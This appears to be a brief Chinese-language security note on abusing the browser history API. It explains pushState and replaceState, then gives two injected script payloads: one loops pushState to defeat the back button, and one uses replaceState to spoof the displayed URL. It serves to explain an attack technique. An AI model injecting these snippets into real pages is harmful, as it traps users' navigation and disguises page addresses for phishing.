# window.history新API的恶意利用

## 0x00 简介

API就两个：

* `pushState()`: push 新的history实体
* `replaceState()`:替换当前的history实体

不过限制就是更改的history实体只能是属于同一document对象的，也就是说限制了为同一源

## 0x02 利用方式

当可以注入js代码时，利用如下代码可使用户在点击back按钮后，回退浏览器历史无效，除非是达到相应的次数（当前的URL为`http://example.com/test.html`）

```
<script>
    for (var i=0; i <100; i++) {
        window.history.pushState({},'','/test.html');
    }
</script>
```

另一种方式则是可以伪造当前的地址（当前的URL为`http://example.com/tom.html`）

```
<script>
    window.history.replaceState({},'','/larry.html');
</script>
```
